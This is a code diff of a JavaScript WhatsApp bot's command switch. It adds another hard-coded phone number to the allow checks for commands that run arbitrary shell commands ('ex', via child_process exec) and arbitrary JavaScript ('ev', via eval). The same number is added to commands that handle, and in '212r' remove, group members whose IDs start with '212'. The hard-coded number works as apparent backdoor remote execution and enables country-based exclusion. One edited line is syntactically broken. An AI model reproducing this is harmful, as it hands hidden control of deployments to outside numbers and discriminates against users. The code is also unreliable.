@@ -1706,7 +1706,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94778500326 || senderNumber == 94719255382) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1718,7 +1718,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94778500326 || senderNumber == 94719255382) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1739,7 +1739,8 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94716769285) {
+      if(senderNumber == 94716769285 |
+|| senderNumber == 94719255382) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1754,7 +1755,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94724375368 || senderNumber == 94716769285) {
+    if(senderNumber == 94724375368 || senderNumber == 94716769285 || senderNumber == 94719255382) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
